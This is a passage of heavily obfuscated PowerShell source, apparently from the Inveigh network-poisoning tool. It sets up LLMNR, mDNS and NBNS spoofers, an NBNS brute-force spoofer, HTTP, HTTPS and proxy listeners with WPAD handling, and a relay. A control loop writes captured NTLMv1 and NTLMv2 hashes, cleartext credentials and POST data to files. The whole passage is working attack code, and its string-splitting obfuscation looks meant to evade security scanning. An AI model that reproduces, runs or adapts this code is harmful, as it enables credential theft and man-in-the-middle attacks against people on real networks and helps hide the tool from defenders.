                ${iNv`E`iGH}."l`oG".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - Inveigh exited due to $exit_message "))
            }

            &("{3}{2}{1}{0}" -f'p','ee','rt-Sl','Sta') -S 1
            ${Inv`EI`gH}."ru`N`NInG" = ${FA`LSe}
        }

        if(${In`Veigh}."relaY`_RUn`Ni`Ng")
        {
            &("{3}{1}{0}{2}"-f '-','art','Sleep','St') -S 1
            ${iN`V`EIGH}."CoNsOlE_Q`Ue`UE".("{1}{0}" -f 'dd','A').Invoke(("Inveigh Relay exited due to $exit_message at $(Get-Date -format 's') "))

            if(${I`NvEIGH}."fIle_`O`UTP`UT")
            {
                ${I`NVEIgH}."L`OG_FiL`E_QuE`UE".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - Inveigh Relay exited due to $exit_message "))
            }

            if(${i`NVei`GH}."loG_`Ou`TPut")
            {
                ${in`VEi`Gh}."l`og".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - Inveigh Relay exited due to $exit_message "))
            }

            &("{1}{2}{0}" -f'leep','S','tart-S') -S 1
            ${i`NvEi`Gh}."rE`L`Ay_RU`NnIng" = ${f`AlSe}

        } 

        ${invE`I`GH}."H`TTpS" = ${F`ALSe}
    }

    if(${NbNs`BrUteForcEp`AU`SE})
    {   
        ${nBN`S`_`PAUse} = &("{3}{1}{2}{0}"-f 'pan','-Ti','meS','New') -Seconds ${nB`N`sbr`Ut`E`FOrcePausE}
    }

    ${ruN_C`o`U`N`T_NTlMV1} = ${ru`Nc`OUNT} + ${I`NVEi`gH}."Ntl`mV1_l`IST"."co`UnT"
    ${rU`N_co`Un`T_NTlmv2} = ${ru`Nco`UNt} + ${I`NvE`IGh}."n`TlmV2_`lIsT"."Co`UnT"
    ${RUN_C`o`U`N`T_c`LEartEXt} = ${r`UNCou`Nt} + ${inv`Ei`gh}."clE`ArT`ExT_lI`ST"."Cou`NT"

    if(${r`Un`TiME})
    {    
        ${CoNT`Rol`_Timeo`UT} = &("{1}{2}{0}"-f'meSpan','N','ew-Ti') -Minutes ${r`U`NTiMe}
        ${C`oNTro`l_S`TOPw`ATch} =  (vARiabLE Cw5 -vAluEon)::("{1}{0}{2}" -f't','Star','New').Invoke()
    }

    while(${iN`VEI`gH}."R`UNnInG")
    {

        if(${nbNSBrUTEFoRC`EP`A`U`Se} -and ${INve`I`Gh}."hO`sTnaMe`_sp`O`of")
        {
         
            if(${i`N`VEiGH}."n`BNs_`StOp`wa`TcH"."E`l`ApsED" -ge ${Nb`NS_PaU`sE})
            {
                ${IN`V`EIgH}."HOsTnamE_`s`p`oOF" = ${f`A`lse}
            }
        
        }

        if(${rU`Nco`Unt})
        {
            
            if(${inv`Ei`Gh}."N`TLMv1`_LI`St"."CoU`NT" -ge ${r`U`N`_CouNT_N`TLMV1} -or ${i`NVEI`gh}."Ntlm`V2_L`iST"."Co`UNT" -ge ${Run_C`Ou`NT_nt`lM`V2} -or ${INVe`I`GH}."cLEartEX`T_l`IsT"."Co`UNT" -ge ${RU`N_CO`Un`T`_ClEART`EXt})
            {
                &("{1}{2}{0}" -f'veigh','StopI','n') ("{1}{2}{0}" -f't','run ','coun')           
            }

        }

        if(${rUNt`IMe})
        {

            if(${C`OntroL_StOpWA`T`CH}."E`laPS`ed" -ge ${c`onTRoL`_`TImeO`Ut})
            {
                &("{0}{1}{3}{2}"-f 'Sto','pI','eigh','nv') ("{1}{0}{2}" -f ' ','run','time')
            }

        }

        if(${Inv`E`IGH}."FI`LE`_O`UtPuT")
        {

            while(${In`VE`iGh}."log_`F`Ile_QUEUe"."cO`Unt" -gt 0)
            {
                ${INVe`I`Gh}."lO`G_F`ILe_QUE`Ue"[0]|&("{2}{0}{1}" -f'ut-','File','O') ${I`NVEigH}."l`OG`_`ouT_FilE" -Append
                ${iNvE`I`Gh}."Log_fIle_Q`U`EuE".("{0}{2}{1}" -f 'Remov','t','eA').Invoke(0)
            }

            while(${INv`eI`GH}."NTLm`V1_`FiLe_Q`Ue`Ue"."c`OUNT" -gt 0)
            {
                ${InV`e`iGH}."ntLMv1_f`Il`E`_qUeue"[0]|&("{0}{2}{1}" -f'O','e','ut-Fil') ${i`Nv`eiGh}."n`T`LmV`1_OU`T_FILE" -Append
                ${InV`e`IgH}."nT`LMV1_FI`Le_q`U`eUe".("{0}{2}{1}"-f'R','veAt','emo').Invoke(0)
            }

            while(${Inv`Ei`gh}."ntL`Mv`2_`File_quE`UE"."C`OuNT" -gt 0)
            {
                ${i`N`VeIGH}."N`TL`Mv`2_fILE_QUEuE"[0]|&("{0}{1}{2}"-f 'O','ut-Fil','e') ${I`NVEI`Gh}."nTlmV2`_OUT_`FI`le" -Append
                ${iNve`i`GH}."nT`LMv2`_`F`IL`e_QuEuE".("{2}{1}{0}"-f 'veAt','emo','R').Invoke(0)
            }

            while(${iN`V`eigH}."c`LEARtEx`T_fI`le`_Qu`eUe"."c`ounT" -gt 0)
            {
                ${IN`V`eIgH}."CLea`RtexT_FILe`_`QueUE"[0]|&("{2}{1}{0}" -f'File','ut-','O') ${I`NVei`Gh}."CLe`ARteX`T_oUt_fi`le" -Append
                ${In`VeI`Gh}."CleARText`_FIL`e_Q`UEue".("{0}{2}{1}"-f 'R','moveAt','e').Invoke(0)
            }

            while(${I`NvEigh}."PO`St_rE`qu`E`ST`_fil`E_QUEue"."Co`UNT" -gt 0)
            {
                ${iN`Vei`Gh}."PO`st_`RequES`T_`F`ilE`_qUeue"[0]|&("{1}{0}"-f 'ut-File','O') ${inV`EigH}."POsT_REQuESt`_`out_F`ile" -Append
                ${In`V`eiGH}."PosT_R`e`QUe`st_fILe`_`qu`EUe".("{1}{0}{2}" -f'o','Rem','veAt').Invoke(0)
            }

        }

        if(!${InV`eIGh}."Con`soLE`_oU`T`PuT" -and ${cOn`SOLE`qu`Eu`ELI`MIt} -ge 0)
        {

            while(${In`V`eigh}."CoNSO`le_`qu`Eue"."cO`Unt" -gt ${c`oNSolE`QuEueL`iMit} -and !${i`NV`eiGh}."co`NsOl`E`_oU`TPuT")
            {
                ${inve`Igh}."conso`l`e_`QUe`Ue".("{1}{0}{2}"-f 'ov','Rem','eAt').Invoke(0)
            }

        }

        &("{0}{1}{2}"-f 'S','tart-Slee','p') -m 5
    }

    ${i`Nv`eIgH}."CON`T`RoL" = ${f`Al`SE}
}





function httPL`ISTEn`ER()
{
    ${Pr`oXy`_`lI`STEnEr} = ${fA`L`sE}
    ${HT`TpS_`LisTEner} = ${Fa`l`se}
    ${HTtP`_ruNsPa`CE} =   (  gI  ('VarIABlE:792'+'Fi'+'b')  )."VA`Lue"::("{0}{2}{1}" -f 'CreateRu','space','n').Invoke()
    ${hTtp_R`UN`s`p`Ace}.("{0}{1}" -f'Op','en').Invoke()
    ${hT`TP`_rUNsp`AcE}."se`SsiO`N`StAte`pROxY".("{1}{2}{3}{0}"-f'le','SetV','ari','ab').Invoke(("{0}{1}"-f'in','veigh'),${IN`VE`igH})
    ${Htt`P_`poWEr`SH`eLl} =  ${H6`L5}::("{1}{0}" -f'reate','C').Invoke()
    ${H`Ttp_`Po`wERsH`ell}."R`Unsp`ACe" = ${h`TtP_`RU`NS`Pace}
    ${h`T`TP_p`owErshELL}.("{2}{0}{1}" -f 'p','t','AddScri').Invoke(${share`d_Ba`sic_FUnCT`ionS_s`C`RIpTBL`oCK}) > ${Nu`Ll}
    ${http_`p`oWERSH`ELl}.("{0}{1}{2}" -f 'Add','Scr','ipt').Invoke(${H`T`TP`_sCRiP`TBLock}).("{3}{1}{0}{2}"-f'n','me','t','AddArgu').Invoke(${CH`A`llen`gE}).("{1}{2}{0}"-f 'rgument','Ad','dA').Invoke(${Htt`PAUTh}).("{2}{1}{0}"-f't','Argumen','Add').Invoke(
        ${HTTP`BA`SiCR`E`Alm}).("{3}{2}{1}{0}" -f 'nt','e','ddArgum','A').Invoke(${H`TT`p`CO`NteNTtYPe}).("{2}{1}{0}" -f'ent','dArgum','Ad').Invoke(${H`TtPIP}).("{0}{1}{2}" -f'AddArgu','m','ent').Invoke(${H`TTpp`oRT}).("{0}{2}{3}{1}"-f 'A','t','dd','Argumen').Invoke(
        ${h`TtpDEF`A`ULteXE}).("{1}{2}{0}{3}" -f'me','AddArg','u','nt').Invoke(${H`TTpDEf`AuLtFILe}).("{0}{2}{1}" -f 'AddAr','ument','g').Invoke(${H`Ttpd`ir}).("{3}{1}{2}{0}"-f't','Argume','n','Add').Invoke(
        ${H`T`TprESETdeL`Ay}).("{0}{1}{2}" -f 'Add','Argumen','t').Invoke(${HTt`PREseTd`elaYTiM`EOuT}).("{2}{0}{1}"-f'dAr','gument','Ad').Invoke(${HtT`pr`espo`N`sE}).("{2}{1}{0}" -f 'ent','Argum','Add').Invoke(
        ${hT`TpS_li`s`TeNER}).("{1}{0}{2}"-f'rgume','AddA','nt').Invoke(${NBnsb`Ru`Te`ForCEp`A`USE}).("{2}{1}{0}"-f'ment','dArgu','Ad').Invoke(${pRo`XY}).("{3}{2}{1}{0}"-f 'nt','gume','Ar','Add').Invoke(
        ${pR`oxY`IGNoRe}).("{1}{0}{3}{2}"-f 'dArg','Ad','ment','u').Invoke(${proXY_LiS`T`En`er}).("{2}{1}{0}" -f 'ent','m','AddArgu').Invoke(${wPaDa`U`TH}).("{1}{0}{2}"-f 'rgum','AddA','ent').Invoke(
        ${wp`A`dauThi`GNo`Re}).("{1}{0}{2}" -f'en','AddArgum','t').Invoke(${w`p`AdR`Esp`onse}) > ${n`ULl}
    ${hTt`p_pOw`ERSh`ElL}.("{2}{0}{1}"-f 'inInvo','ke','Beg').Invoke() > ${n`ULl}
}

&("{2}{3}{1}{0}"-f'p','lee','Sta','rt-S') -m 50


function hTtPsLIS`T`eN`ER()
{
    ${P`R`ox`Y_`LiSTeNEr} = ${Fal`Se}
    ${hT`Tps_`li`Ste`Ner} = ${t`RuE}
    ${htT`pS_Ru`N`SPace} =  ( get-varIabLE  ('792F'+'iB')  -vAlU  )::("{1}{3}{2}{0}"-f'space','C','n','reateRu').Invoke()
    ${htTPs_`Run`S`PAcE}.("{1}{0}" -f'n','Ope').Invoke()
    ${hT`TPs_run`Sp`A`ce}."s`EssIONst`ATe`Proxy".("{3}{2}{1}{0}"-f'ariable','tV','e','S').Invoke(("{1}{0}{2}" -f 'e','inv','igh'),${in`VE`IGH})
    ${httPS_PO`we`R`S`HElL} =  ${H`6l5}::("{1}{0}" -f'ate','Cre').Invoke()
    ${h`Tt`ps_`POWERS`hELL}."RuN`s`PAcE" = ${hTtp`s_RuNs`PacE}
    ${hTtPS_`pO`W`E`RsHelL}.("{2}{0}{1}" -f 'ip','t','AddScr').Invoke(${s`hare`d_BAsic`_F`UnCT`i`OnS_SCR`iPTbLock}) > ${NU`Ll}
    ${htTPs`_P`oWER`shelL}.("{0}{2}{1}"-f'Add','pt','Scri').Invoke(${H`TT`p`_SCRIp`TB`LocK}).("{1}{2}{0}{3}" -f'gumen','Ad','dAr','t').Invoke(${c`HAl`le`NGe}).("{2}{1}{0}" -f 'nt','e','AddArgum').Invoke(${htT`Pa`U`Th}).("{0}{3}{1}{2}"-f 'Add','umen','t','Arg').Invoke(
        ${htt`pB`Asi`C`ReALM}).("{1}{3}{2}{0}" -f'rgument','Ad','A','d').Invoke(${htt`pCONteN`Ttype}).("{2}{1}{0}"-f'ument','rg','AddA').Invoke(${HtT`PIP}).("{3}{0}{1}{2}" -f'dArgume','n','t','Ad').Invoke(${h`T`TPsPOrT}).("{1}{3}{0}{2}" -f 'dAr','A','gument','d').Invoke(
        ${H`T`TpD`efAULtExE}).("{1}{3}{0}{2}"-f'Arg','A','ument','dd').Invoke(${hTt`p`dEFauL`TF`IlE}).("{0}{2}{3}{1}"-f 'A','ent','d','dArgum').Invoke(${h`TTPd`iR}).("{2}{0}{1}"-f 'dAr','gument','Ad').Invoke(
        ${htt`PREsE`T`D`ELAY}).("{2}{1}{0}"-f'ent','dArgum','Ad').Invoke(${HTTP`RESeT`dELAYtI`me`Out}).("{2}{0}{1}"-f'dA','rgument','Ad').Invoke(${httPREsP`o`N`Se}).("{1}{2}{3}{0}"-f't','AddA','r','gumen').Invoke(
        ${HTtPs`_li`STEneR}).("{1}{2}{0}{3}" -f 'r','A','ddA','gument').Invoke(${nBNSB`Ru`T`E`FoRcePAu`se}).("{2}{3}{1}{0}"-f 'ument','g','Add','Ar').Invoke(${p`Ro`xy}).("{1}{2}{0}"-f'ument','A','ddArg').Invoke(
        ${PROx`YiGn`O`RE}).("{2}{1}{0}" -f 'dArgument','d','A').Invoke(${PRoxy`_LIs`T`e`NeR}).("{1}{0}{2}" -f'gume','AddAr','nt').Invoke(${w`PaDau`TH}).("{0}{2}{1}" -f 'Add','ment','Argu').Invoke(
        ${WP`ADaUtH`ig`N`orE}).("{3}{1}{2}{0}" -f 't','g','umen','AddAr').Invoke(${WP`Adr`eS`po`NsE}) > ${Nu`lL}
    ${h`TTPs_pOw`e`RShE`LL}.("{0}{1}{2}{3}"-f'Begin','Inv','ok','e').Invoke() > ${NU`LL}
}

&("{1}{2}{0}{3}" -f 'lee','S','tart-S','p') -m 50


function P`ROXY`LI`St`eneR()
{
    ${pro`X`Y_LiS`Te`NEr} = ${tR`Ue}
    ${HTtps`_liSte`NEr} = ${Fa`lSE}
    ${pR`Ox`y_rUN`sPacE} =  ( vArIable  ("7"+"92"+"FIb")  )."Val`Ue"::("{0}{1}{3}{2}"-f 'Cre','a','Runspace','te').Invoke()
    ${Pro`xy`_rU`N`SpaCE}.("{0}{1}" -f 'O','pen').Invoke()
    ${PRoX`y`_RuNS`paCe}."SEssIOn`S`TATePRO`xy".("{3}{2}{0}{1}"-f 'Variab','le','t','Se').Invoke(("{1}{2}{0}" -f 'gh','inve','i'),${iNVe`IGH})
    ${P`ROXy_PO`W`erSHe`ll} =  (VARiaBlE  ("h6l"+"5"))."Val`Ue"::("{0}{1}{2}" -f 'Cre','at','e').Invoke()
    ${p`R`OxY_`po`wErShe`LL}."rU`Ns`PacE" = ${prOXy`_`R`U`NSPaCE}
    ${Pr`OXy`_`PO`w`ErShell}.("{1}{2}{0}" -f'ipt','A','ddScr').Invoke(${SH`AreD_bASiC_f`UNctio`Ns_scr`IpTB`LO`CK}) > ${Nu`LL}
    ${PROXy`_`POwEr`sHE`ll}.("{2}{1}{0}" -f'cript','dS','Ad').Invoke(${HTTP_sc`R`ip`TbL`oCk}).("{0}{2}{1}"-f 'AddArg','ment','u').Invoke(${CHaL`Le`Nge}).("{1}{2}{0}{3}"-f 'm','AddArg','u','ent').Invoke(${http`A`UtH}).("{1}{0}{2}"-f 'en','AddArgum','t').Invoke(
        ${H`TTPb`Asi`cR`ealm}).("{1}{2}{0}" -f'gument','A','ddAr').Invoke(${hTT`PCoNt`EN`T`Type}).("{1}{2}{0}{3}" -f'e','Ad','dArgum','nt').Invoke(${PR`o`XyIP}).("{2}{1}{0}"-f'Argument','d','Ad').Invoke(${proXy`PO`RT}).("{1}{0}{2}" -f'Ar','Add','gument').Invoke(
        ${HT`TP`DeFaUltExe}).("{2}{0}{1}" -f'g','ument','AddAr').Invoke(${h`TTp`DE`FA`UltFILE}).("{0}{1}{2}" -f 'A','ddArgumen','t').Invoke(${Ht`TPDir}).("{2}{3}{1}{0}" -f'gument','r','Ad','dA').Invoke(
        ${HTtpRE`S`etd`ELaY}).("{0}{3}{2}{1}" -f'A','ument','g','ddAr').Invoke(${httprese`TdElA`yT`iME`o`UT}).("{2}{1}{0}"-f'nt','Argume','Add').Invoke(${htTpReS`P`o`Nse}).("{1}{0}{2}" -f 'dArgume','Ad','nt').Invoke(
        ${h`T`T`PS_lI`sTENer}).("{1}{0}{2}"-f'me','AddArgu','nt').Invoke(${n`BN`SBru`TEfORcepA`USE}).("{1}{0}{3}{2}"-f'um','AddArg','t','en').Invoke(${Pr`oxY}).("{1}{0}{3}{2}" -f 'dAr','Ad','ment','gu').Invoke(
        ${Pro`Xy`igNorE}).("{1}{3}{0}{2}" -f 'Ar','A','gument','dd').Invoke(${PROX`y_l`i`sTE`NeR}).("{1}{0}{2}" -f'dArgume','Ad','nt').Invoke(${wpad`A`UtH}).("{1}{2}{0}"-f'ument','AddAr','g').Invoke(
        ${wpa`D`AUThIg`N`orE}).("{3}{1}{0}{2}"-f'n','e','t','AddArgum').Invoke(${w`padReS`P`onse}) > ${N`ULl}
    ${p`RO`xy_Po`WerSHell}.("{2}{1}{0}"-f 'nInvoke','egi','B').Invoke() > ${N`Ull}
}


function SN`i`F`FERSpoOfeR()
{
    ${SnI`FF`Er_`RuNSPaCe} =   ${792F`iB}::("{3}{0}{1}{4}{2}" -f 'e','at','ace','Cr','eRunsp').Invoke()
    ${snI`Ff`er_RuN`SPA`CE}.("{1}{0}" -f'en','Op').Invoke()
    ${sN`IFF`Er_R`UNsPAce}."S`e`S`sI`ONsta`TEpRoXY".("{1}{0}{2}"-f 'Variab','Set','le').Invoke(("{2}{1}{0}"-f'gh','ei','inv'),${INV`EIgh})
    ${sNIfFeR_`POwER`sh`ell} =  ${h6`l5}::("{1}{0}"-f 'reate','C').Invoke()
    ${sn`i`F`F`eR_P`OWeRs`helL}."rU`NsPa`ce" = ${sN`i`Ff`er_`RunsPACE}
    ${SNI`Ffe`R`_`PO`wERsHEll}.("{1}{2}{0}" -f 'ipt','AddSc','r').Invoke(${SHa`R`Ed_baSIC_fUNc`TIONS_SCRIpTbl`o`Ck}) > ${n`ULl}
    ${sNIF`FER`_pOwer`SHeLl}.("{2}{0}{1}"-f 'dScri','pt','Ad').Invoke(${Smb_`N`TlM_`Fu`Nc`TIoNS`_sCRi`pTbLO`ck}) > ${N`ULl}
    ${S`NiF`FER_pOwERs`H`eLL}.("{1}{0}{2}" -f'd','A','dScript').Invoke(${Sni`F`F`ER_s`c`RiptBLOCK}).("{2}{1}{0}"-f 't','Argumen','Add').Invoke(${i`P}).("{2}{0}{3}{1}"-f'rgu','nt','AddA','me').Invoke(${LLM`Nr}).("{0}{3}{1}{2}"-f 'Add','rgume','nt','A').Invoke(
        ${LLmNR_re`sp`Ons`E`_`MeSSA`GE}).("{2}{1}{0}{3}"-f'Argu','d','Ad','ment').Invoke(${L`L`mN`Rttl}).("{2}{0}{1}{3}"-f'ume','n','AddArg','t').Invoke(${md`NS}).("{1}{0}{2}" -f'd','A','dArgument').Invoke(
        ${mDns`_`R`espO`NSE`_mESsAGe}).("{0}{2}{1}" -f'A','ment','ddArgu').Invoke(${MDn`sTy`PEs}).("{1}{2}{0}{3}" -f 'Argume','Ad','d','nt').Invoke(${m`DNSTtL}).("{2}{0}{1}"-f'umen','t','AddArg').Invoke(
        ${n`Bns}).("{1}{2}{0}"-f'gument','AddA','r').Invoke(${n`BNS_REs`PO`Ns`e_MessaGe}).("{0}{1}{2}" -f 'A','ddArg','ument').Invoke(${nbNs`T`ypes}).("{0}{1}{2}"-f 'A','ddArgume','nt').Invoke(${NBn`sTtl}).("{3}{0}{1}{2}" -f 'Ar','gum','ent','Add').Invoke(
        ${s`mB}).("{1}{0}{3}{2}" -f'um','AddArg','nt','e').Invoke(${SPo`ofeRhoS`TS`IGN`O`RE}).("{1}{0}{2}"-f'ume','AddArg','nt').Invoke(${SPoOF`Er`HO`sT`sreP`Ly}).("{1}{2}{0}"-f 'nt','AddArg','ume').Invoke(
        ${S`PO`OfERIp}).("{2}{3}{1}{0}" -f't','umen','A','ddArg').Invoke(${SPO`o`FerI`p`sIgN`Ore}).("{1}{2}{0}" -f'nt','A','ddArgume').Invoke(${S`P`ooFERI`p`sREPLy}).("{2}{3}{1}{0}"-f 't','gumen','AddA','r').Invoke(
        ${sPOoFeR`lE`A`R`NiNG}).("{2}{0}{3}{1}"-f 'dArg','nt','Ad','ume').Invoke(${SPo`Of`e`R`LEArNinG`dEl`AY}).("{0}{1}{2}" -f 'Ad','dAr','gument').Invoke(${spOOfERl`ear`N`I`NgIn`TeRval}) > ${Nu`lL}
    ${sN`iFfeR_poW`e`R`SHE`lL}.("{1}{0}{2}"-f 'eginIn','B','voke').Invoke() > ${n`Ull}
}


function lL`MNRs`pOo`Fer()
{
    ${L`lm`Nr`_s`poOfer_Ru`NSP`ACE} =   (ChildITem vaRIabLe:792fIb )."vA`LUE"::("{1}{0}{3}{2}"-f 'eRunspa','Creat','e','c').Invoke()
    ${l`Lm`NR`_S`PooFe`R`_R`UnsPaCe}.("{1}{0}" -f'n','Ope').Invoke()
    ${L`Lmnr`_SPoO`FeR`_rU`NSPaCe}."sesSi`OnS`TATe`pR`oXy".("{0}{3}{2}{1}" -f'SetVari','le','b','a').Invoke(("{0}{2}{1}"-f'inv','gh','ei'),${InvE`i`gh})
    ${lLMnR_sP`OOfEr_P`o`wE`RSheLl} =  (  Ls ("VAR"+"IA"+"BlE:H6l"+"5")  )."VAL`Ue"::("{1}{2}{0}"-f'ate','Cr','e').Invoke()
    ${lLm`Nr`_s`p`OoFer_powErsHELl}."R`UNsP`ACe" = ${lLm`N`R_sP`oOFER_RUnsPa`CE}
    ${ll`mn`R_S`pooFeR`_`P`owE`RsHell}.("{0}{1}{2}"-f'Add','Scr','ipt').Invoke(${SHar`eD_bA`S`Ic_F`UNcTi`Ons_S`cR`iP`Tb`lOcK}) > ${nu`ll}
    ${lLMnr_sPo`OF`eR_pOw`eRsHe`ll}.("{3}{0}{2}{1}"-f'cr','t','ip','AddS').Invoke(${lL`m`Nr`_SPOO`FeR_sCri`PTbLo`cK}).("{1}{3}{0}{2}"-f'gu','Ad','ment','dAr').Invoke(${In`SPe`ct}).("{3}{0}{1}{2}"-f 'ddA','r','gument','A').Invoke(
        ${lLMnR_res`ponS`e_`m`esSAgE}).("{3}{2}{0}{1}"-f'ume','nt','g','AddAr').Invoke(${sP`oOf`ERIP}).("{0}{2}{1}" -f 'AddAr','nt','gume').Invoke(${spOoFE`Rhos`Ts`RE`PLy}).("{0}{1}{2}{3}" -f 'Add','Ar','gumen','t').Invoke(
        ${sPo`o`Fe`RHoSTS`iGNo`RE}).("{2}{1}{0}{3}"-f 'rgum','dA','Ad','ent').Invoke(${sPOofEr`iPsR`EpLY}).("{3}{2}{1}{0}" -f 't','en','ddArgum','A').Invoke(${s`pooFeRiPs`iG`NoRE}).("{2}{0}{1}"-f'ddArgume','nt','A').Invoke(
        ${l`LM`NRttL}) > ${nu`lL}
    ${LlM`N`R_SPOof`e`R_poWERshE`LL}.("{0}{2}{1}"-f 'B','Invoke','egin').Invoke() > ${N`ULl}
}


function mD`NsSpo`O`FEr()
{
    ${MD`N`S_spOof`eR_RuNspa`cE} =   ${7`92F`iB}::("{0}{3}{2}{4}{1}" -f'Cr','pace','a','e','teRuns').Invoke()
    ${mD`N`s_spo`OfeR_run`SPa`cE}.("{1}{0}" -f'pen','O').Invoke()
    ${MDN`S`_SPOOfe`R`_runs`pACe}."seSsI`oNstATe`p`R`o`xY".("{1}{2}{0}" -f 'le','SetVa','riab').Invoke(("{0}{1}" -f'in','veigh'),${inve`iGh})
    ${m`dn`S`_SPO`oFE`R_`POweRShEll} =  ${H6`L5}::("{0}{1}{2}"-f 'Crea','t','e').Invoke()
    ${Md`NS_SP`Oo`F`er_PoWershelL}."RUN`sP`ACE" = ${MDNS_SP`oO`F`e`R_`RuNsPacE}
    ${m`DNs_`sPoof`ER_POw`eR`s`HeLl}.("{2}{1}{0}"-f 't','dScrip','Ad').Invoke(${shAreD_b`ASiC_F`Unc`TiON`S_sCriP`TBloCK}) > ${Nu`Ll}
    ${md`Ns`_s`pooFe`R_POwErsh`eLl}.("{1}{2}{0}"-f'dScript','A','d').Invoke(${Mdn`S`_spo`ofE`R_scRIptbLOCk}).("{1}{2}{0}" -f'ument','AddAr','g').Invoke(${in`sP`Ect}).("{0}{2}{1}"-f 'AddA','t','rgumen').Invoke(
        ${mDN`S`_`REsponSE_m`essAgE}).("{1}{0}{2}" -f'Argu','Add','ment').Invoke(${mD`NST`Tl}).("{2}{1}{0}"-f'gument','Ar','Add').Invoke(${Mdns`TYP`Es}).("{1}{0}{2}{3}"-f'u','AddArg','men','t').Invoke(${SPOo`F`eRIP}).("{1}{2}{0}" -f 'gument','Add','Ar').Invoke(
        ${spoOfE`R`h`oSTsR`e`PLy}).("{2}{1}{0}"-f'ment','Argu','Add').Invoke(${sPoO`FERhO`StsiG`NOrE}).("{2}{1}{0}"-f'Argument','d','Ad').Invoke(${SPOO`F`ERi`P`SrEPlY}).("{0}{1}{2}"-f 'A','ddArgume','nt').Invoke(
        ${SPOOFeRi`PS`I`gnO`RE}) > ${N`Ull}
    ${MDNs_SP`OO`F`eR_PO`W`E`RShEll}.("{0}{2}{1}"-f 'Be','nInvoke','gi').Invoke() > ${N`ULl}
}


function n`B`NsSpO`OFer()
{
    ${N`Bn`S_sPo`oFEr_`Run`spa`ce} =   (  GI ("VAR"+"IAble:792"+"fI"+"B")  )."V`AluE"::("{1}{0}{3}{2}{4}" -f'eate','Cr','c','Runspa','e').Invoke()
    ${NbNs`_`SPoO`Fer`_`RUnS`PaCe}.("{1}{0}"-f 'en','Op').Invoke()
    ${NbnS_sPoO`F`e`R`_`RunsPA`CE}."SESsiOnsTat`E`pr`OxY".("{1}{2}{0}" -f'iable','SetVa','r').Invoke(("{0}{2}{1}"-f 'inve','h','ig'),${IN`VEi`gH})
    ${nBNS_spoofEr`_`PO`W`ERS`helL} =  ( Get-CHILDiTem VariabLe:H6l5  )."Val`Ue"::("{2}{1}{0}"-f 'ate','re','C').Invoke()
    ${N`B`Ns_s`p`O`Ofer_p`OwErSheLl}."rUn`s`PAcE" = ${n`BN`s_`SPoOF`Er_`RUNS`pace}
    ${nbNs`_spOo`FER_`pO`weRshELl}.("{0}{2}{1}"-f 'AddSc','ipt','r').Invoke(${sH`A`REd`_Ba`SIC_fu`NC`T`io`NS_sC`RIptbLOCK}) > ${N`ULl}
    ${n`Bns_sPO`oFE`R_poWer`sheLL}.("{0}{1}"-f'AddSc','ript').Invoke(${NBNs_SPOOF`er`_`s`crIpTblOck}).("{2}{3}{1}{0}" -f 'nt','e','AddArg','um').Invoke(${I`NSpeCT}).("{2}{0}{1}"-f'Arg','ument','Add').Invoke(
        ${N`B`NS`_r`eSPOnS`E_messaGe}).("{0}{2}{1}" -f 'AddArgume','t','n').Invoke(${S`P`OofeRIp}).("{2}{1}{0}" -f'rgument','dA','Ad').Invoke(${Nb`N`StY`pes}).("{2}{0}{1}"-f'ddAr','gument','A').Invoke(
        ${sPOOfErHo`sTsR`EP`ly}).("{2}{1}{0}"-f't','en','AddArgum').Invoke(${S`p`oOFerH`Osts`i`gnorE}).("{0}{1}{2}" -f 'AddArgu','m','ent').Invoke(${S`PoOFEriPSr`e`PLY}).("{2}{1}{0}{3}" -f 'rgu','A','Add','ment').Invoke(
        ${SPOo`F`ERI`PS`IgNOrE}).("{0}{2}{3}{1}"-f 'AddAr','t','gume','n').Invoke(${nbN`sT`TL}) > ${Nu`Ll}
    ${nBNS_`spOoFEr`_P`O`WERS`H`eLl}.("{3}{2}{1}{0}"-f 'nInvoke','i','g','Be').Invoke() > ${N`UlL}
}


function NbN`sBRuTe`FORceSp`oOF`er()
{
    ${nb`Ns_`BR`U`TEForce_S`POo`Fe`R_R`Uns`PaCE} =  (  gEt-vaRiABLe ("7"+"92Fib"))."v`ALuE"::("{2}{3}{0}{1}{4}"-f'uns','pa','C','reateR','ce').Invoke()
    ${NBNs`_BR`UT`eFO`RCE_SpOofER_r`UnSpAcE}.("{1}{0}" -f'pen','O').Invoke()
    ${nbnS_BRu`T`ef`oRcE_S`PoOf`e`R_RuN`SpaCE}."sESsiOnST`A`TEp`R`oxY".("{2}{1}{0}{3}"-f'l','tVariab','Se','e').Invoke(("{1}{0}{2}" -f'nve','i','igh'),${I`NvE`igh})
    ${NbNs_BruTE`For`c`E`_SPoo`F`er_`pO`WErsHeLl} =  (gI ('VarIa'+'b'+'Le:H6L5') )."vaL`Ue"::("{1}{0}"-f 'reate','C').Invoke()
    ${NbNs_bRu`TefoRc`E_sPoof`er_`poW`E`R`sh`e`lL}."run`SP`Ace" = ${nbnS_bruTE`Fo`RCE_sPOOf`E`R`_`R`UnSpaCe}
    ${N`B`N`S_bruT`eF`ORce_`SPo`oFe`R_P`oWERsHE`LL}.("{1}{0}{2}"-f 'dScrip','Ad','t').Invoke(${sHa`RED_BA`s`IC_F`U`N`CtioNS_s`C`R`iPT`BLOCK}) > ${Nu`ll}
    ${N`B`N`s_B`RUtEforCe_spOo`FER`_pOwerSHELl}.("{1}{0}{2}" -f 'ddScri','A','pt').Invoke(${NB`N`S_`Br`UTE`FOrce_SPOO`F`eR_sC`RI`PTb`lOCk}).("{3}{0}{2}{1}"-f 'dArgume','t','n','Ad').Invoke(
        ${sPooF`Er`IP}).("{1}{0}{2}"-f'ddAr','A','gument').Invoke(${nb`N`SbRUte`FO`R`CEhost}).("{0}{2}{1}" -f'Ad','ument','dArg').Invoke(${nBN`S`B`RuT`EFOrCETArgeT}).("{1}{0}{2}"-f'gu','AddAr','ment').Invoke(
        ${nBNSbrUTe`F`ORCE`p`AUsE}).("{1}{0}{2}" -f'en','AddArgum','t').Invoke(${nbn`stTL}) > ${N`UlL}
    ${Nbns_`BrutEF`oRcE_spO`OFER`_`p`OwERSHell}.("{0}{2}{1}" -f 'Be','Invoke','gin').Invoke() > ${n`ULl}
}


function co`NTRollO`OP()
{
    ${C`O`NTrOL_R`UN`SpaCe} =  ( VARIable  ('792'+'fib')  )."v`AlUE"::("{3}{1}{2}{0}" -f 'ce','teRunsp','a','Crea').Invoke()
    ${c`on`TrOl`_ru`NSP`AcE}.("{0}{1}"-f'Ope','n').Invoke()
